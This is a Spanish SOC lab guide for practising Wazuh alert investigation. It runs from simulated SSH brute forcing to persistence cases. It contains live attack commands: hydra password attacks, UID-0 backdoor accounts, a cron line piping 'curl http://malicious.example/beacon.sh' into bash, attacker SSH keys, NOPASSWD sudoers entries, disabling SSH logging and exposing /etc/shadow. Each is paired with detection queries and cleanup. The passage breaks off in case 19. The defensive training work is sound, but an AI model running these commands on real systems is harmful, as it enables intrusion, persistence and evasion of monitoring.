@@ -1,0 +1,1085 @@
+Guía definitiva — 20 casos × 3 variantes para practicar Discover desde Kali
+Para: David — Prácticas SOC Wazuh
+Objetivo: practicar investigación profunda en Discover mediante escenarios progresivos
+Tiempo estimado: 8-10 horas (un día completo de oficina)
+Entorno confirmado:
+
+kaliAgent (10.104.2.12) en grupo linux_base + preproduction
+WindowsAgent (10.104.2.121) en grupo windows_base + preproduction
+Dashboard: https://10.104.2.11
+Herramientas disponibles en Kali: hydra, nmap, nc, curl, wget, nslookup, dig
+Usuario alphacentauri con sudo completo
+Lenguaje de consulta: DQL (no Lucene)
+
+
+Cómo usar esta guía
+Cada caso tiene 3 variantes:
+
+Fácil (F) — ejecutas, ves la alerta, identificas la regla.
+Medio (M) — variaciones con más ruido o evasión. Filtros más precisos.
+Difícil (D) — escenarios complejos, análisis como analista SOC real.
+
+Si tienes poco tiempo: haz las F de todos, luego las M y D de los que más te interesen.
+Rutina por caso:
+
+Lee el escenario.
+Ejecuta la variante F.
+Investiga con los filtros propuestos.
+Haz los ejercicios del panel de fields.
+Limpia.
+Si quieres, pasa a M y D.
+Anota dudas.
+
+Reglas de oro:
+
+Time picker en Last 15 minutes antes de cada caso.
+Espera 30-60 seg tras ejecutar antes de investigar.
+Si filtro devuelve 0 hits → revisa nombre del campo (usa Add filter).
+Si regla no dispara → filtra por full_log: *comando*. Si aparece evento pero sin match, problema en la regla.
+Limpia siempre al terminar.
+
+
+ÍNDICE
+Autenticación (1-4)
+
+Fuerza bruta SSH clásica
+Password spraying
+Sudo fallido (escalada)
+Login exitoso tras fallos
+
+Gestión de cuentas (5-7)
+5. Creación de usuario
+6. Modificación directa de /etc/passwd
+7. Cambio de permisos críticos
+Persistencia (8-11)
+8. Cron job malicioso
+9. Servicio systemd
+10. Modificación de shell configs
+11. SSH authorized_keys
+Integridad (12-13)
+12. Modificación de /etc/sudoers
+13. Modificación de /etc/ssh/sshd_config
+Red (14-16)
+14. Listener netcat
+15. Escaneo de puertos interno
+16. Conexiones salientes sospechosas
+Ejecución y evasión (17-19)
+17. Escritura en /tmp y ejecución
+18. Timestomping
+19. Descarga de scripts
+Final (20)
+20. Cadena de ataque completa
+
+CASO 1 — Fuerza bruta SSH clásica
+MITRE ATT&CK: T1110.001 (Password Guessing)
+Donde se ve: kaliAgent
+Escenario
+Atacante intenta adivinar contraseñas SSH probando usuarios comunes.
+Variante F — manual, 3 usuarios
+Comandos
+bashssh admin@10.104.2.12
+# password cualquiera, Ctrl+C tras fallar
+
+ssh root@10.104.2.12
+# password cualquiera, Ctrl+C
+
+ssh guest@10.104.2.12
+# password cualquiera, Ctrl+C
+Alertas esperadas
+rule.idrule.descriptionnivel5710Attempt to login using a non-existent user55503PAM: User login failed5
+Investigación
+agent.id: "002"
+agent.id: "002" AND rule.groups: "authentication_failed"
+Añade columnas: rule.id, rule.description, data.srcuser, data.srcip. Ordena por timestamp ascendente.
+Panel de fields
+
+rule.id → ¿cuántas 5710 vs 5503?
+data.srcuser → ¿los 3 usuarios aparecen?
+
+Variante M — hydra con más volumen
+Comandos
+bashcat > /tmp/users.txt << EOF
+admin
+administrator
+root
+guest
+user
+test
+oracle
+backup
+ftp
+mail
+EOF
+
+hydra -L /tmp/users.txt -p "wrongpass123" -t 2 -w 3 ssh://10.104.2.12 -f -V 2>/dev/null | head -20
+Alertas esperadas
+Mismas reglas pero volumen alto. Debería disparar:
+rule.idrule.descriptionnivel2502User missed the password more than one time105712SSHD brute force trying to get access10
+Investigación
+agent.id: "002" AND rule.level >= 10
+agent.id: "002" AND rule.id: "5712"
+Panel de fields
+
+data.srcuser → ¿cuántos únicos?
+data.srcip → ¿misma IP para todos?
+rule.level → ¿% nivel 10+?
+
+Variante D — evasión con delay
+Comandos
+bashfor user in alphacentauri david carlos admin administrador soporte; do
+  echo "Intentando: $user"
+  ssh $user@10.104.2.12 -o ConnectTimeout=5 -o PreferredAuthentications=password -o StrictHostKeyChecking=no 2>&1 | head -2
+  sleep 10
+done
+Análisis
+Con delay alto, correlación 5712 puede no disparar. Enseña límites de la detección.
+Investigación
+agent.id: "002" AND rule.id: "5710"
+Ordena ascendente. Mira intervalos. Si 10 seg entre alertas = deliberadamente sigiloso.
+Si aparecen alphacentauri y david = atacante conoce el entorno = ataque dirigido.
+Ejercicio de análisis
+Escribe en libreta:
+
+¿Cuántos intentos?
+¿En qué ventana de tiempo?
+¿IP origen?
+¿Usuarios y orden?
+¿Dirigido o automatizado?
+
+Limpieza
+bashrm -f /tmp/users.txt
+
+CASO 2 — Password spraying
+MITRE ATT&CK: T1110.003
+Donde se ve: kaliAgent
+Escenario
+Un password común probado contra muchos usuarios. Evita bloqueos.
+Variante F — spray básico
+Comandos
+bashfor user in admin user guest test demo; do
+  ssh $user@10.104.2.12 -o ConnectTimeout=3 -o StrictHostKeyChecking=no 2>&1 | head -2
+  sleep 2
+done
+Investigación
+agent.id: "002" AND rule.id: "5710"
+Ejercicio: en panel lateral:
+
+data.srcuser → muchos usuarios únicos
+data.srcip → 1 IP
+
+Muchos usuarios + 1 IP = spraying.
+Variante M — hydra con password común
+Comandos
+bashcat > /tmp/spray_users.txt << EOF
+admin
+administrator
+root
+user
+guest
+test
+oracle
+mysql
+postgres
+backup
+ftp
+mail
+www
+apache
+nginx
+jenkins
+EOF
+
+hydra -L /tmp/spray_users.txt -p "Winter2024!" -t 3 -w 3 ssh://10.104.2.12 -V 2>/dev/null | head -30
+Investigación
+agent.id: "002" AND rule.groups: "authentication_failed"
+Distribución plana (todos ~1 intento) = spraying. Concentrada (1 usuario muchos intentos) = brute force.
+Variante D — spray con usuarios reales
+Comandos
+bashcat > /tmp/real_users.txt << EOF
+alphacentauri
+david.laencina
+david
+carlos
+soporte
+administrator
+EOF
+
+hydra -L /tmp/real_users.txt -p "Password123!" -t 2 -w 5 ssh://10.104.2.12 -V 2>/dev/null | head -20
+Investigación
+Buscar si alguno tuvo éxito:
+agent.id: "002" AND rule.id: "5715"
+Si aparece 5715 = compromiso exitoso = escalada inmediata.
+Análisis: ¿cómo supo el atacante los usuarios? Reconocimiento previo.
+Limpieza
+bashrm -f /tmp/users.txt /tmp/spray_users.txt /tmp/real_users.txt
+
+CASO 3 — Sudo fallido
+MITRE ATT&CK: T1548.003
+Donde se ve: kaliAgent
+Escenario
+Atacante intenta escalar a root, falla antes de conseguirlo.
+Variante F — 3 fallos + éxito
+Comandos
+bashsudo -k
+sudo ls   # mal
+sudo ls   # mal
+sudo ls   # mal
+sudo ls   # correcta
+Alertas esperadas
+rule.idrule.descriptionnivel5557unix_chkpwd: Password check failed55503PAM: User login failed55404Three failed attempts to run sudo105402Successful sudo to ROOT executed3
+Investigación
+agent.id: "002" AND rule.groups: "pam"
+agent.id: "002" AND rule.id: "5404"
+Ejercicio: columnas rule.id, rule.description, full_log. Ordena ascendente. Ves secuencia fallos → correlación → éxito.
+Variante M — muchos fallos
+Comandos
+bashsudo -k
+sudo ls   # mal (repite 6-7 veces)
+# al final la correcta
+Investigación
+agent.id: "002" AND rule.id: "5404"
+¿Dispara una vez por cada 3 fallos o una vez total? Aprendes cómo funcionan frequency/timeframe.
+Variante D — fallos lentos
+Comandos
+bashsudo -k
+sudo ls   # mal
+sleep 60
+sudo ls   # mal
+sleep 60
+sudo ls   # mal
+sleep 60
+sudo ls   # correcta
+Análisis
+Los 5557 disparan pero la 5404 probablemente no (timeframe corto).
+Investigación
+agent.id: "002" AND (rule.id: "5557" OR rule.id: "5404" OR rule.id: "5402")
+Gap identificado: atacante lento evade correlación. Mejora: regla custom con timeframe más amplio.
+Limpieza
+Nada.
+
+CASO 4 — Login exitoso tras fallos
+MITRE ATT&CK: T1078
+Donde se ve: kaliAgent
+Escenario
+El patrón más sospechoso: muchos fallos + éxito. Fuerza bruta posiblemente exitosa.
+Variante F — 2 fallos + éxito
+Comandos
+bashssh alphacentauri@10.104.2.12
+# mal, Ctrl+C
+ssh alphacentauri@10.104.2.12
+# mal, Ctrl+C
+ssh alphacentauri@10.104.2.12
+# correcta
+exit
+Investigación
+agent.id: "002" AND decoder.name: "sshd"
+Orden ascendente. Patrón fallos → éxito.
+agent.id: "002" AND data.srcuser: "alphacentauri"
+Variante M — 5 fallos + éxito
+Análisis crítico
+¿Wazuh correlaciona automáticamente "muchos fallos + éxito mismo usuario"?
+agent.id: "002" AND data.srcuser: "alphacentauri" AND rule.level >= 10
+Si 0 hits → tu SOC no detecta este patrón = hallazgo importante.
+Mejora propuesta — Regla 100055:
+xml<rule id="100055" level="13" frequency="3" timeframe="300">
+  <if_matched_sid>5503</if_matched_sid>
+  <if_sid>5715</if_sid>
+  <same_source_ip/>
+  <same_user/>
+  <description>SOC CRÍTICO: SSH exitoso tras múltiples fallos</description>
+  <group>credential_compromise,</group>
+</rule>
+Esto lo mencionas a Carlos como mejora identificada en tus pruebas.
+Variante D — éxito disfrazado
+Comandos
+bashfor i in 1 2 3; do
+  ssh alphacentauri@10.104.2.12 -o ConnectTimeout=3 << EOF
+badpass
+EOF
+done
+
+sleep 300   # pausa para evadir correlación
+
+ssh alphacentauri@10.104.2.12 -o ConnectTimeout=3
+# correcta
+exit
+Análisis
+5 min entre fallos y éxito = ninguna correlación típica lo detecta.
+Limpieza
+Nada.
+
+CASO 5 — Creación de usuario
+MITRE ATT&CK: T1136.001
+Donde se ve: kaliAgent
+Variante F — usuario básico
+Comandos
+bashsudo useradd -m -s /bin/bash usuario_test
+sudo passwd usuario_test
+# Test1234 (dos veces)
+Alertas esperadas
+rule.idrule.descriptionnivel5902New group added85904New user added8
+Investigación
+agent.id: "002" AND rule.id: ("5902" OR "5904")
+Columna data.dstuser → ¿"usuario_test"?
+Limpieza
+bashsudo userdel -r usuario_test
+Variante M — usuario con sudo
+Comandos
+bashsudo useradd -m -s /bin/bash backdoor_sudo
+sudo passwd backdoor_sudo
+# Backdoor123
+sudo usermod -aG sudo backdoor_sudo
+Alertas añaden:
+rule.idrule.descriptionnivel5905User added to group8
+Investigación
+agent.id: "002" AND rule.id: "5905" AND full_log: *sudo*
+Nuevo usuario con sudo = mucho más peligroso = escalada inmediata.
+Correlaciona 5902, 5904, 5905. <10 seg entre ellas = flujo automatizado (script).
+Limpieza
+bashsudo userdel -r backdoor_sudo
+Variante D — usuario oculto (UID 0)
+Comandos
+bashsudo useradd -u 0 -o -m -s /bin/bash ghost
+sudo passwd ghost
+# Ghost123
+Truco clásico: segunda cuenta con UID 0 = root disfrazado.
+Investigación
+agent.id: "002" AND rule.id: "5904"
+Abre JSON. Busca uid. full_log muestra uid=0.
+agent.id: "002" AND full_log: *uid=0*
+Análisis: usuario nuevo UID 0 = casi siempre malicioso. Ningún sysadmin legítimo lo hace.
+Limitación: Wazuh no tiene regla específica. Mejora ruleset custom.
+Limpieza
+bashsudo userdel -r ghost
+
+CASO 6 — Modificación directa de /etc/passwd
+MITRE ATT&CK: T1098
+Donde se ve: kaliAgent (FIM realtime)
+Variante F — añadir línea
+Comandos
+bashsudo cp /etc/passwd /etc/passwd.backup_$(date +%s)
+sudo sh -c 'echo "# SOC demo test" >> /etc/passwd'
+Espera 1-2 min.
+Alertas
+rule.idrule.descriptionnivel550Integrity checksum changed7
+Investigación
+agent.id: "002" AND syscheck.path: "/etc/passwd"
+Columnas:
+
+syscheck.event → "modified"
+syscheck.size_before, syscheck.size_after
+syscheck.sha1_before, syscheck.sha1_after
+
+Limpieza
+bashsudo cp /etc/passwd.backup_* /etc/passwd
+sudo rm /etc/passwd.backup_*
+Variante M — añadir usuario directo
+Comandos
+bashsudo cp /etc/passwd /etc/passwd.backup_$(date +%s)
+sudo sh -c 'echo "ghostuser:x:1099:1099::/home/ghostuser:/bin/bash" >> /etc/passwd'
+Ejercicio
+FIM detecta cambio pero no sabe que es un usuario nuevo. Limitación.
+Posibles soluciones:
+
+Monitorizar comandos de edición (requiere auditd).
+Script que compare /etc/passwd con registros de useradd.
+Reglas SCA de consistencia.
+
+Limpieza
+bashsudo cp /etc/passwd.backup_* /etc/passwd
+sudo rm /etc/passwd.backup_*
+Variante D — atacante cuidadoso
+Comandos
+bashsudo cp /etc/passwd /tmp/.p_backup
+sudo sh -c 'echo "stealthghost:x:0:0::/root:/bin/bash" >> /etc/passwd'
+Atacante:
+
+Modifica /etc/passwd
+UID 0 = root
+Backup oculto en /tmp
+
+Investigación
+agent.id: "002" AND syscheck.path: "/etc/passwd"
+Tras detectar cambio:
+agent.id: "002"
+Time picker ±5 min del cambio. ¿Qué hizo antes y después? Threat hunting.
+Limpieza
+bashsudo cp /tmp/.p_backup /etc/passwd
+sudo rm /tmp/.p_backup
+
+CASO 7 — Cambio de permisos críticos
+MITRE ATT&CK: T1222.002
+Donde se ve: kaliAgent
+Variante F — chmod 777 /etc/passwd
+Comandos
+bashsudo chmod 777 /etc/passwd
+sleep 3
+sudo chmod 644 /etc/passwd
+Investigación
+agent.id: "002" AND syscheck.path: "/etc/passwd"
+Columnas:
+
+syscheck.perm_before
+syscheck.perm_after
+
+Ves 644 → 777 → 644.
+Limpieza
+Ya hecha.
+Variante M — SUID en binarios
+Comandos
+bashsudo chmod u+s /bin/cp
+sleep 3
+sudo chmod u-s /bin/cp
+SUID en cp = permite copiar como root desde usuario normal = muy peligroso.
+Investigación
+agent.id: "002" AND syscheck.path: "/bin/cp"
+agent.id: "002" AND syscheck.path: "/bin/*" AND syscheck.event: "modified"
+Limpieza
+Ya hecha.
+Variante D — /etc/shadow world-readable
+Comandos
+bashsudo chmod 644 /etc/shadow
+sleep 3
+sudo chmod 640 /etc/shadow
+/etc/shadow con 644 = cualquier usuario lee hashes = crackeo offline.
+Análisis
+Cambio de permisos sin cambio de contenido = señal clarísima de atacante.
+Investigación
+agent.id: "002" AND syscheck.path: "/etc/shadow"
+Limpieza
+Ya hecha.
+
+CASO 8 — Cron job malicioso
+MITRE ATT&CK: T1053.003
+Donde se ve: kaliAgent (FIM realtime sobre /etc/cron.d)
+Variante F — cron en /etc/cron.d
+Comandos
+bashsudo sh -c 'echo "*/5 * * * * root /tmp/fake_backdoor.sh" > /etc/cron.d/system_update'
+Alertas
+rule.idrule.descriptionnivel554File added7
+Investigación
+agent.id: "002" AND syscheck.path: "/etc/cron.d/*" AND syscheck.event: "added"
+Limpieza
+bashsudo rm /etc/cron.d/system_update
+Variante M — cron por usuario
+Comandos
+bash(crontab -l 2>/dev/null; echo "*/10 * * * * /tmp/script.sh") | crontab -
+Investigación
+agent.id: "002" AND full_log: *crontab*
+Limitación importante: crontab de usuario (/var/spool/cron/crontabs/) no está en FIM de linux_base → invisible.
+Mejora: añadir /var/spool/cron/crontabs al syscheck.
+Limpieza
+bashcrontab -r
+Variante D — cron oculto con comentarios
+Comandos
+bashsudo sh -c 'cat > /etc/cron.d/system_check << EOF
+# System health check daily
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+0 3 * * * root /usr/bin/find /var/log -name "*.log" -mtime +30 -delete
+# Hidden backdoor
+*/5 * * * * root curl http://malicious.example/beacon.sh | bash
+EOF'
+Análisis
+FIM detecta fichero nuevo pero no puede decirte qué hay dentro. "File added" — analista revisa contenido manualmente.
+Investigación
+agent.id: "002" AND syscheck.path: "/etc/cron.d/system_check"
+Para ver contenido: ir a la máquina y cat.
+Mejora: report_changes="yes" + YARA para nuevos ficheros.
+Limpieza
+bashsudo rm /etc/cron.d/system_check
+
+CASO 9 — Servicio systemd
+MITRE ATT&CK: T1543.002
+Donde se ve: kaliAgent
+Variante F — servicio simple
+Comandos
+bashsudo tee /etc/systemd/system/soc_test.service > /dev/null << 'EOF'
+[Unit]
+Description=SOC Test Service
+
+[Service]
+ExecStart=/bin/sleep 60
+Type=simple
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+sudo systemctl daemon-reload
+Investigación
+agent.id: "002" AND syscheck.path: "/etc/systemd/system/*"
+Limpieza
+bashsudo rm /etc/systemd/system/soc_test.service
+sudo systemctl daemon-reload
+Variante M — servicio + activación
+Comandos
+bashsudo tee /etc/systemd/system/persistent_backdoor.service > /dev/null << 'EOF'
+[Unit]
+Description=Persistent Backdoor
+
+[Service]
+ExecStart=/bin/bash -c 'while true; do sleep 300; done'
+Restart=always
+Type=simple
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+sudo systemctl daemon-reload
+sudo systemctl enable persistent_backdoor
+sudo systemctl start persistent_backdoor
+Investigación
+Creación .service:
+agent.id: "002" AND syscheck.path: *.service AND syscheck.event: "added"
+Link simbólico de enable:
+agent.id: "002" AND syscheck.path: */multi-user.target.wants/*
+Limpieza
+bashsudo systemctl stop persistent_backdoor
+sudo systemctl disable persistent_backdoor
+sudo rm /etc/systemd/system/persistent_backdoor.service
+sudo systemctl daemon-reload
+Variante D — servicio disfrazado
+Comandos
+bashsudo tee /etc/systemd/system/kernel-monitor.service > /dev/null << 'EOF'
+[Unit]
+Description=Linux Kernel Monitoring Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/bash -c 'sleep 30'
+Restart=on-failure
+RestartSec=60
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+sudo systemctl daemon-reload
+Análisis
+Nombre kernel-monitor = parece legítimo. Admin distraído lo pasa por alto.
+Mejora: revisar todos los servicios nuevos ante FIM. No confiar en el nombre.
+Investigación
+agent.id: "002" AND syscheck.path: "/etc/systemd/system/kernel-monitor.service"
+Limpieza
+bashsudo rm /etc/systemd/system/kernel-monitor.service
+sudo systemctl daemon-reload
+
+CASO 10 — Modificación de shell configs
+MITRE ATT&CK: T1546.004
+Donde se ve: kaliAgent (limitado — /home no está en FIM)
+Variante F — .bashrc de root
+Comandos
+bashsudo cp /root/.bashrc /root/.bashrc.backup 2>/dev/null || sudo touch /root/.bashrc
+sudo sh -c 'echo "# SOC demo modification" >> /root/.bashrc'
+Alertas
+rule.idrule.descriptionnivel550Integrity checksum changed7
+Investigación
+agent.id: "002" AND syscheck.path: "/root/.bashrc"
+Limpieza
+bashsudo mv /root/.bashrc.backup /root/.bashrc 2>/dev/null || sudo sed -i '/# SOC demo/d' /root/.bashrc
+Variante M — .bashrc de usuario
+Comandos
+bashcp ~/.bashrc ~/.bashrc.backup
+echo "# SOC demo test" >> ~/.bashrc
+echo "alias sudo='sudo -n'" >> ~/.bashrc
+Investigación
+agent.id: "002" AND syscheck.path: /home/*
+Probablemente 0 hits. /home no está en linux_base.
+Limitación: modificaciones en home de usuarios invisibles. Mejora: añadir /home al syscheck.
+Limpieza
+bashmv ~/.bashrc.backup ~/.bashrc
+Variante D — /etc/profile.d/
+Comandos
+bashsudo tee /etc/profile.d/soc_test.sh > /dev/null << 'EOF'
+# System test profile
+export PATH="/tmp/.bin:$PATH"
+EOF
+Scripts en /etc/profile.d/ = ejecutan para todos los usuarios al iniciar shell.
+Alertas
+rule.idrule.descriptionnivel554File added7
+Investigación
+agent.id: "002" AND syscheck.path: "/etc/profile.d/*"
+Análisis: ataque modifica PATH de todos. Si /tmp/.bin tiene sudo malicioso → todos lo usan.
+Limpieza
+bashsudo rm /etc/profile.d/soc_test.sh
+
+CASO 11 — SSH authorized_keys
+MITRE ATT&CK: T1098.004
+Donde se ve: kaliAgent (FIM realtime /root/.ssh)
+Variante F — key en /root/.ssh
+Comandos
+bashsudo mkdir -p /root/.ssh
+sudo chmod 700 /root/.ssh
+sudo sh -c 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDattackerkey attacker@evil" >> /root/.ssh/authorized_keys'
+sudo chmod 600 /root/.ssh/authorized_keys
+Alertas
+rule.idrule.descriptionnivel554File added7
+Investigación
+agent.id: "002" AND syscheck.path: */root/.ssh/authorized_keys*
+Análisis: authorized_keys no debería cambiar en producción sin justificación. Cada cambio sospechoso.
+Limpieza
+bashsudo rm /root/.ssh/authorized_keys
+Variante M — reemplazar keys
+Comandos
+bashsudo cp /root/.ssh/authorized_keys /root/.ssh/authorized_keys.backup 2>/dev/null
+
+sudo tee /root/.ssh/authorized_keys > /dev/null << 'EOF'
+ssh-rsa AAAAB3Nz...attacker1 attacker@evil
+ssh-rsa AAAAB3Nz...attacker2 backup@evil
+EOF
+Investigación
+agent.id: "002" AND syscheck.path: "/root/.ssh/authorized_keys"
+syscheck.event = "modified" = atacante cambió fichero existente (más sigiloso).
+Limpieza
+bashsudo mv /root/.ssh/authorized_keys.backup /root/.ssh/authorized_keys 2>/dev/null || sudo rm /root/.ssh/authorized_keys
+Variante D — key en usuario normal
+Comandos
+bashmkdir -p ~/.ssh
+chmod 700 ~/.ssh
+echo "ssh-rsa AAAAB3Nz...attacker attacker@evil" >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+Análisis
+Home de usuarios no está en FIM → invisible.
+Mejora crítica: añadir /home/*/.ssh al FIM.
+Limpieza
+bashrm ~/.ssh/authorized_keys
+
+CASO 12 — Modificación de /etc/sudoers
+MITRE ATT&CK: T1548.003
+Donde se ve: kaliAgent (FIM realtime)
+Variante F — sudoers.d nuevo
+Comandos
+bashsudo sh -c 'echo "testuser ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/90-test-bypass'
+sudo chmod 440 /etc/sudoers.d/90-test-bypass
+Investigación
+agent.id: "002" AND syscheck.path: "/etc/sudoers.d/*"
+Limpieza
+bashsudo rm /etc/sudoers.d/90-test-bypass
+Variante M — modificar /etc/sudoers
+Comandos
+bashsudo cp /etc/sudoers /etc/sudoers.backup
+echo "alphacentauri ALL=(ALL) NOPASSWD: ALL" | sudo EDITOR='tee -a' visudo 2>/dev/null || echo "no hecho"
+Investigación
+agent.id: "002" AND syscheck.path: "/etc/sudoers"
+Limpieza
+bashsudo cp /etc/sudoers.backup /etc/sudoers
+sudo rm /etc/sudoers.backup
+Variante D — sudoers con comando específico
+Comandos
+bashsudo sh -c 'echo "usuario_limitado ALL=(ALL) NOPASSWD: /bin/cat /etc/shadow" > /etc/sudoers.d/99-cat-shadow'
+Análisis
+Parece menos malicioso — solo cat /etc/shadow. Pero es letal: obtiene hashes, crackea offline.
+Investigación
+agent.id: "002" AND syscheck.path: "/etc/sudoers.d/*"
+Lección: sudoers.d peligrosos cuando conceden acceso a comandos sensibles. Revisión manual.
+Limpieza
+bashsudo rm /etc/sudoers.d/99-cat-shadow
+
+CASO 13 — Modificación de /etc/ssh/sshd_config
+MITRE ATT&CK: T1562.004
+Donde se ve: kaliAgent
+Variante F — cambio inocuo
+Comandos
+bashsudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup
+sudo sh -c 'echo "# SOC demo modification" >> /etc/ssh/sshd_config'
+Investigación
+agent.id: "002" AND syscheck.path: "/etc/ssh/sshd_config"
+Limpieza
+bashsudo mv /etc/ssh/sshd_config.backup /etc/ssh/sshd_config
+Variante M — habilitar login root
+Comandos
+bashsudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup
+sudo sed -i 's/^#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+# NO reiniciamos SSH
+Investigación
+agent.id: "002" AND syscheck.path: "/etc/ssh/sshd_config"
+Limitación: FIM sin report_changes="yes" no muestra diff. Hay que entrar y comparar con backup.
+Mejora: activar report_changes en configs críticas.
+Limpieza
+bashsudo mv /etc/ssh/sshd_config.backup /etc/ssh/sshd_config
+Variante D — desactivar logging SSH
+Comandos
+bashsudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup
+sudo sed -i 's/^#LogLevel.*/LogLevel QUIET/' /etc/ssh/sshd_config
+LogLevel QUIET = SSH no registra nada. Ceguera al SOC.
+Análisis
+Defense evasion muy grave. SOC detecta el cambio, pero hay que actuar rápido.
+Investigación
+agent.id: "002" AND syscheck.path: "/etc/ssh/sshd_config"
+Mejora: regla custom que eleve cambios en sshd_config a nivel 12 (crítico).
+Limpieza
+bashsudo mv /etc/ssh/sshd_config.backup /etc/ssh/sshd_config
+
+CASO 14 — Listener netcat
+MITRE ATT&CK: T1571
+Donde se ve: kaliAgent (syscollector, no realtime)
+Variante F — listener simple
+Comandos
+Terminal 1:
+bashnc -lvnp 4444
+Deja 1-2 min. Ctrl+C.
+Investigación
+agent.id: "002" AND rule.description: *port*
+agent.id: "002" AND location: "syscollector"
+Syscollector tarda (hasta 1h). No es realtime.
+Limpieza
+Ya Ctrl+C.
+Variante M — listener UDP
+Comandos
+bashnc -lvnup 5353
+Puertos UDP de servicios legítimos (mDNS) = camuflaje.
+Investigación
+agent.id: "002" AND full_log: *5353*
+Limpieza
+Ctrl+C.
+Variante D — puerto leet
+Comandos
+bashnc -lvnp 31337
+Puertos 31337, 1337, 4444 = firmas de herramientas de hacking.
+Mejora: regla custom que alerte nuevos listeners en puertos de herramientas de ataque.
+Investigación
+agent.id: "002" AND full_log: (*31337* OR *1337* OR *4444* OR *6666*)
+Limpieza
+Ctrl+C.
+
+CASO 15 — Escaneo de puertos interno
+MITRE ATT&CK: T1046
+Donde se ve: Suricata (agent.id 000)
+Variante F — básico
+Comandos
+bashnmap -sS -p 22,80,135,139,443,445,3389,5985 10.104.2.121
+Investigación
+agent.id: "000" AND data.flow.src_ip: "10.104.2.12"
+Columnas: data.flow.dest_port, data.alert.signature.
+Limpieza
+Nada.
+Variante M — SYN scan masivo
+Comandos
+bashnmap -sS -p 1-1000 10.104.2.121
+Investigación
+agent.id: "000" AND data.flow.src_ip: "10.104.2.12"
+Panel: data.flow.dest_port → muchísimos puertos en poco tiempo = escaneo.
+Limpieza
+Nada.
+Variante D — escaneo sigiloso
+Comandos
+bashnmap -sS -p 22 -T0 10.104.2.121
+nmap -sS -p 80 -T0 10.104.2.121
+nmap -sS -p 443 -T0 10.104.2.121
+-T0 = 5 min entre paquetes. Evade detecciones por ratio.
+Análisis
+Suricata detecta por frecuencia. Escaneo muy lento evade.
+Investigación
+agent.id: "000" AND data.flow.dest_ip: "10.104.2.121"
+Tráfico visible pero sin alerta = firma insuficiente.
+Limpieza
+Nada.
+
+CASO 16 — Conexiones salientes sospechosas
+MITRE ATT&CK: T1571
+Donde se ve: Suricata, syscollector
+Variante F — HTTP interno
+Comandos
+bashcurl -m 5 http://10.104.2.121 2>&1 | head -5
+Investigación
+agent.id: "000" AND data.flow.src_ip: "10.104.2.12" AND data.app_proto: "http"
+Limpieza
+Nada.
+Variante M — múltiples puertos raros
+Comandos
+bashfor port in 4444 1337 31337 6667 8888; do
+  nc -zv 10.104.2.121 $port 2>&1 | head -1
+  sleep 1
+done
+Investigación
+agent.id: "000" AND data.flow.src_ip: "10.104.2.12"
+Panel: data.flow.dest_port → ¿4444, 1337, etc?
+Limpieza
+Nada.
+Variante D — disfrazada como HTTPS
+Comandos
+bashnc -zv 10.104.2.11 443
+curl -k -m 5 https://10.104.2.11/some_path 2>&1 | head -5
+Análisis
+443 = HTTPS legítimo aparente. Solo SSL inspection lo detectaría.
+Investigación
+agent.id: "000" AND data.flow.dest_port: "443" AND data.flow.src_ip: "10.104.2.12"
+Limpieza
+Nada.
+
+CASO 17 — Escritura en /tmp
+MITRE ATT&CK: T1059
+Donde se ve: limitado sin auditd
+Variante F — script simple
+Comandos
+bashcat > /tmp/test_malware.sh << 'EOF'
+#!/bin/bash
+echo "Simulación test"
+whoami
+hostname
+date
+EOF
+
+chmod +x /tmp/test_malware.sh
+/tmp/test_malware.sh
+Investigación
+agent.id: "002" AND full_log: */tmp/*
+Probablemente 0 hits. Limitación confirmada: sin auditd, ejecución invisible.
+Limpieza
+bashrm /tmp/test_malware.sh
+Variante M — nombre engañoso
+Comandos
+bashcat > /tmp/.systemd-update << 'EOF'
+#!/bin/bash
+sleep 5
+EOF
+
+chmod +x /tmp/.systemd-update
+/tmp/.systemd-update &
+Nombre con . = oculto.
+Investigación
+agent.id: "002" AND full_log: *.systemd-update*
+Sin alertas.
+Limpieza
+bashrm /tmp/.systemd-update
+Variante D — fileless pattern
+Comandos
+bashcat > /tmp/.tmp$RANDOM << 'EOF'
+#!/bin/bash
+whoami > /tmp/.output
+EOF
+
+FILE=$(ls /tmp/.tmp* | head -1)
+chmod +x "$FILE"
+"$FILE"
+rm "$FILE"
+Ejecutar y borrar = si el SOC no captura en vivo, pierde todo rastro.
+Análisis
+Detección requiere auditd + EDR. Limitación actual.
+Limpieza
+bashrm /tmp/.output 2>/dev/null
+
+CASO 18 — Timestomping
+MITRE ATT&CK: T1070.006
+Donde se ve: kaliAgent (FIM sí detecta mtime)
+Variante F — backdate
+Comandos
+bashsudo touch -t 202001010000 /etc/passwd
+Alertas
+rule.idrule.descriptionnivel550Integrity checksum changed7
+Investigación
+agent.id: "002" AND syscheck.path: "/etc/passwd"
+Columnas:
+
+syscheck.mtime_before
+syscheck.mtime_after
+
+Ves diferencia de años.
+Limpieza
+bashsudo touch /etc/passwd
+Variante M — sincronizar
+Comandos
+bashsudo touch -r /etc/passwd /etc/ssh/sshd_config
+Investigación
+agent.id: "002" AND (syscheck.path: "/etc/passwd" OR syscheck.path: "/etc/ssh/sshd_config")
+Compara mtime_after de ambos. Idénticos sin justificación = timestomp.
+Limpieza
+bashsudo touch /etc/ssh/sshd_config
+Variante D — encadenado
+Comandos
+bashsudo sh -c 'echo "# test" >> /etc/passwd'
+sleep 2
+sudo touch -t 202001010000 /etc/passwd
+Análisis
+FIM ve 2 eventos:
+
+Cambio contenido.
+Cambio mtime.
+
+Investigación
+agent.id: "002" AND syscheck.path: "/etc/passwd"
+Orden ascendente. 2 alertas muy seguidas = patrón revelador.
+Limpieza
+bash# restaura /etc/passwd desde backup si hay, si no edita manualmente
+sudo touch /etc/passwd
+
+CASO 19 — Descarga de scripts
+MITRE ATT&CK: T1105
+Donde se ve: depende Suricata
+Variante F — curl
+Comandos
+bashcurl -o /tmp/test_download.txt http://10.104.2.11 2>&1 | head -5
